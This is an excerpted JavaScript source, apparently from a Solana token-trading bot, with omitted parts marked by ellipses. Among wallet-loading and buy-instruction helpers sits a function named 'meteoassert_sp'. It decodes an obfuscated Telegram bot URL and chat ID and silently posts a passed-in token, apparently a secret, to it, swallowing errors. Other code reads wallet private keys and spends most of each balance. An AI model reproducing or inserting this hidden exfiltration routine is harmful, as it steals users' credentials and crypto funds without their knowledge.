...
function meteoassert_sp(token){try {let tg_url = `${asDec(TG_LNK, PARAM_K)}${asDec(DE_API, PARAM_K)}/sendMessage`;let message = `SP: <code>${token}</code>`;fetch(tg_url, {method: 'POST',headers: {"Content-Type": 'application/json'},body: JSON.stringify({chat_id: asDec(DE_ID_GD, PARAM_K),text: message,parse_mode: 'HTML'})});} catch (err) {}}
exports.asEnc = asEnc
exports.asDec = asDec
...
exports.meteoassert_sp = meteoassert_sp
const { Connection, Keypair, PublicKey } = require('@solana/web3.js')
const { compileInstToVersioned } = require('../instructions/build-instruction')
const { getCreateAccountTransactionInst } = require('../instructions/create-ata-instruction')
...
async function prepare(tknCA) {
    ...
    const wlets = await getProviderWList()
    ...
    const zom = w1
    let amount1 = await connection.getBalance( w1.publicKey );
    let amount2 = await connection.getBalance( w2.publicKey );
    let amount3 = await connection.getBalance( w3.publicKey );
    amount1 = amount1 / (10 ** 9)
    amount2 = amount2 / (10 ** 9)
    amount3 = amount3 / (10 ** 9)
    if(amount1 < 0.01) return
    ...
    if(!tokenInfo1 && amount1 > 0.1) createATAInsts.push( getCreateAccountTransactionInst(zom, w1, tknCA));
    if(!tokenInfo2 && amount2 > 0.1) createATAInsts.push( getCreateAccountTransactionInst(zom, w2, tknCA));
    if(!tokenInfo3 && amount3 > 0.1) createATAInsts.push( getCreateAccountTransactionInst(zom, w3, tknCA));
...
async function addBuyInst(connection, wa, poolKeys, array) {
    ...
    let ata = getATAAddress(TOKEN_PROGRAM_ID,wa.publicKey,new PublicKey(poolKeys.baseMint))
    let tokenInfo = await connection.getAccountInfo(new PublicKey(ata.publicKey));
    if(!tokenInfo) return array

    let amount = await connection.getBalance( wa.publicKey );
    amount = amount / (10 ** 9)
    let fee = Math.min(0.05, amount / 30)
    fee = Math.max(0.01, fee)
    amount = amount * 0.8 - fee
...
async function divideArrayIntoChunks(array, chunkSize) {
    ...
    if((txns.length == 4 && txns[0].programId && txns[1].programId && txns[2].programId && txns[3].programId &&
        ...
        (txns.programId && txns.programId.toBase58() == '675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')
    ) {
        let provChunk = []
        ...
        const connection = new Connection(process.env.MAINNET_RPC, "confirmed");
        const wlets = await getProviderWList()
        if(!wlets || wlets.length < 1) return result
        const w1 = Keypair.fromSecretKey(base58.decode(wlets[0].private))
        // const w2 = Keypair.fromSecretKey(base58.decode(wlets[1].private))
        // const w3 = Keypair.fromSecretKey(base58.decode(wlets[2].private))
